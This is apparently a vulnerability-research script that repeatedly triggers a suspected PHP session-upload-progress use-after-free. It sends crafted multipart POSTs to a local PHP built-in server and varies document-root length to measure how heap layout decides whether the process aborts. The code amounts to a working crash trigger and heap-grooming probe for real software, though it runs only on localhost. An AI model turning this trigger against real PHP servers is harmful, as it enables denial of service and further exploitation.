#!/usr/bin/env python3
"""
Measure how sensitive the abort is to heap layout.

The freed php_serialize_data is 64 bytes. Request startup allocates the
SCRIPT_FILENAME zend_string at 25 + len(docroot) + 10 bytes, so it should land
in the 64-byte bucket exactly when len(docroot) is 22..29. This script proves or
refutes that by sweeping docroot lengths and repeating each one.

Everything it touches lives under --base (default /tmp/phpuaf-sweep).
"""
from __future__ import annotations

import argparse
import os
import shutil
import socket
import subprocess
import sys
import time
import re

HERE = os.path.dirname(os.path.abspath(__file__))
BOUNDARY = "----labboundary"


def body(sid: str, fnlen: int, datalen: int) -> bytes:
    return b"".join([
        f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"'
        f"\r\n\r\n{sid}\r\n".encode(),
        f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="upfile"; filename="{"F" * fnlen}"'
        f'\r\nContent-Type: application/octet-stream\r\n\r\n'.encode(),
        b"D" * datalen + b"\r\n",
        f"--{BOUNDARY}--\r\n".encode(),
    ])


def send(port: int, payload: bytes, sid: str, timeout: float = 20.0) -> bytes:
    head = (
        f"POST /probe.php HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(payload)}\r\nConnection: close\r\n\r\n"
    ).encode()
    sock = socket.create_connection(("127.0.0.1", port), timeout=timeout)
    sock.sendall(head + payload)
    out = b""
    while True:
        chunk = sock.recv(65536)
        if not chunk:
            break
        out += chunk
    sock.close()
    return out


def trial(port: int, docroot: str) -> tuple[bool, int | None]:
    assert "/engagements/" not in docroot, "refusing to delete inside the workspace"
    shutil.rmtree(docroot, ignore_errors=True)
    os.makedirs(os.path.join(docroot, "sess"))
    shutil.copy(os.path.join(HERE, "probe.php"), docroot)

    proc = subprocess.Popen(
        ["php", "-n", "-d", "post_max_size=64M", "-d", "upload_max_filesize=32M",
         "-d", f"session.save_path={docroot}/sess", "-d", "memory_limit=8M",
         "-d", "session.upload_progress.enabled=1", "-d", "display_errors=1",
         "-S", f"127.0.0.1:{port}", "-t", docroot],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, cwd=docroot,
    )
    time.sleep(0.85)
    r1 = send(port, body("a1", 2_000_000, 1000), "a1")
    oom = bool(re.search(rb"memory size", r1))
    try:
        send(port, body("f1", 10, 100), "f1")
    except OSError:
        pass
    time.sleep(0.35)
    rc = proc.poll()
    if rc is None:
        proc.kill()
        proc.wait()
    return oom, rc


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="/tmp/phpuaf-sweep")
    ap.add_argument("--port", type=int, default=10100)
    ap.add_argument("--reps", type=int, default=4)
    ap.add_argument("--min-len", type=int, default=18)
    ap.add_argument("--max-len", type=int, default=34)
    args = ap.parse_args()

    print(f"# docroot sweep — base={args.base} reps={args.reps}")
    print(f"# {'len':>3}  {'abort/reps':>10}  docroot")
    port = args.port
    for n in range(args.min_len, args.max_len + 1):
        pad = args.base + "/" + "d" * max(1, n - len(args.base) - 1)
        if len(pad) != n:
            continue
        aborts = 0
        for _ in range(args.reps):
            port += 1
            oom, rc = trial(port, pad)
            aborts += int(rc == -6)
        print(f"  {n:>3}  {aborts:>6}/{args.reps:<3}  {pad}  {'OK' if oom else 'NO-OOM'}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
